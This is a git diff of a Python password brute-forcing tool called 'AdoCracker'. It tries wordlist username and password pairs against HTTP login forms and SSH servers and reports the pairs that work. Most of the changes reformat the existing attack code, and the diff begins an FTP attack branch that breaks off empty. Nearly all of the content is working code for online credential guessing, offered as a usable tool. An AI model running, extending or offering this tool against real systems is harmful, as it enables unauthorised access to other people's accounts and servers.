@@ -6,6 +6,7 @@ from pyfiglet import figlet_format
 import argparse
 import time
 import paramiko
+import ftplib
 
 banner = "AdoCracker"
 print(figlet_format(banner, font="standard"))
@@ -104,7 +105,7 @@ if args.service == "http":
                     else:
                         print("\n\033[1;92m-----------------------------------------------------------"
                               "\n Username and Password found:", user, "=>", pwd,
-                             "----------------------------------------------------------")
+                              "----------------------------------------------------------")
                         break
                 else:
                     print("\n\033[1;31m------------------------------------------------------------------"
@@ -132,7 +133,7 @@ if args.service == "http":
                     print('\033[1;37m''[+]', username, '_', pwd)
                 post = {f'{form1}': username, f'{form2}': pwd, 'submit': "Submit"}
                 re = requests.post(target, data=post)
-                if args.response in re.text: # Change this according to the server respond when login attempt failed
+                if args.response in re.text:
                     pass
                 else:
                     print("\n\033[1;92m-----------------------------------------"
@@ -173,6 +174,7 @@ elif args.service == "ssh":
             for user in user_list:
                 user = user.rstrip()
 
+
                 def open_ssh(target, port, user, password):
                     ssh = paramiko.SSHClient()
                     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -187,18 +189,24 @@ elif args.service == "ssh":
                                 return False
                             print('\033[1;37m''[+]', user, '_', password)
                         return False
-                    except paramiko.ssh_exception.NoValidConnectionsError :
-                        print(f"\n\033[1;33m[*] Connection timeout, The script will restart connection in 10 seconds... Press CTRL+c to cancel")
+                    except paramiko.ssh_exception.NoValidConnectionsError:
+                        print(
+                            f"\n\033[1;33m[*] Connection timeout, The script will restart connection in 10 seconds... "
+                            f"Press CTRL+c to cancel")
                         time.sleep(10)
                         return open_ssh(target, port, user, password)
                     except paramiko.ssh_exception.SSHException:
-                        print("\n\033[1;31mConnection was aborted by the software in your host machine... And we don't know why")
+                        print(
+                            "\n\033[1;31mConnection was aborted by the software in your host machine... And we don't "
+                            "know why")
                         exit(0)
                     else:
                         print("\n\033[1;92m-----------------------------------------"
                               "\n Username found:", user,
                               "\n------------------------------------------")
                         exit(0)
+
+
                 open_ssh(target, port, user, password)
             else:
                 print("\n\033[1;31m------------------------------------------------------------------"
@@ -214,6 +222,7 @@ elif args.service == "ssh":
                 if ":" in line:
                     user = line.split(':')[0]
                     pwd = line.split(':')[1]
+
 
                     def open_ssh(target, port, user, pwd):
                         ssh = paramiko.SSHClient()
@@ -231,24 +240,28 @@ elif args.service == "ssh":
                             return False
                         except paramiko.ssh_exception.NoValidConnectionsError:
                             print(
-                                f"\n\033[1;33m[*] Connection timeout, The script will restart connection in 10 seconds... Press CTRL+c to cancel")
+                                f"\n\033[1;33m[*] Connection timeout, The script will restart connection in 10 "
+                                f"seconds... Press CTRL+c to cancel")
                             time.sleep(10)
                             return open_ssh(target, port, user, password)
                         except paramiko.ssh_exception.SSHException:
                             print(
-                                "\n\033[1;31mConnection was aborted by the software in your host machine... And we don't know why")
+                                "\n\033[1;31mConnection was aborted by the software in your host machine... And we "
+                                "don't know why")
                             exit(0)
                         else:
                             print("\033[1;92m-----------------------------------------------------------"
                                   "\n Username and Password found:", user, "=>", pwd,
                                   "----------------------------------------------------------")
                             exit(0)
+
+
                     open_ssh(target, port, user, pwd)
             else:
                 print("\n\033[1;31m------------------------------------------------------------------"
-                    "\n Sorry!! No password or username found on your wordlist"
-                    "\n Please provide wordlist with more words to increase your chance"
-                    "\n------------------------------------------------------------------")
+                      "\n Sorry!! No password or username found on your wordlist"
+                      "\n Please provide wordlist with more words to increase your chance"
+                      "\n------------------------------------------------------------------")
                 exit(0)
 
         # When password file provided
@@ -258,6 +271,7 @@ elif args.service == "ssh":
 
             for pwd in pwd_list:
                 pwd = pwd.rstrip()
+
 
                 def open_ssh(target, port, username, pwd):
                     ssh = paramiko.SSHClient()
@@ -275,18 +289,22 @@ elif args.service == "ssh":
                         return False
                     except paramiko.ssh_exception.NoValidConnectionsError:
                         print(
-                            f"\n\033[1;33m[*] Connection timeout, The script will restart connection in 10 seconds... Press CTRL+c to cancel")
+                            f"\n\033[1;33m[*] Connection timeout, The script will restart connection in 10 seconds... "
+                            f"Press CTRL+c to cancel")
                         time.sleep(10)
                         return open_ssh(target, port, username, pwd)
                     except paramiko.ssh_exception.SSHException:
                         print(
-                            "\n\033[1;31mConnection was aborted by the software in your host machine... And we don't know why")
+                            "\n\033[1;31mConnection was aborted by the software in your host machine... And we don't "
+                            "know why")
                         exit(0)
                     else:
                         print("\n\033[1;92m-----------------------------------------"
                               "\n Password found:", pwd,
                               "\n------------------------------------------")
                         exit(0)
+
+
                 open_ssh(target, port, username, pwd)
 
     except KeyboardInterrupt:
@@ -294,7 +312,11 @@ elif args.service == "ssh":
         exit(0)
     else:
         print("\n\033[1;31m------------------------------------------------------------------"
-            "\n Sorry!! No password or username found on your wordlist"
-            "\n Please provide wordlist with more words to increase your chance"
-            "\n------------------------------------------------------------------")
+              "\n Sorry!! No password or username found on your wordlist"
+              "\n Please provide wordlist with more words to increase your chance"
+              "\n------------------------------------------------------------------")
         exit(0)
+
+# Attacking FTP
+elif args.service == "ftp":
+    
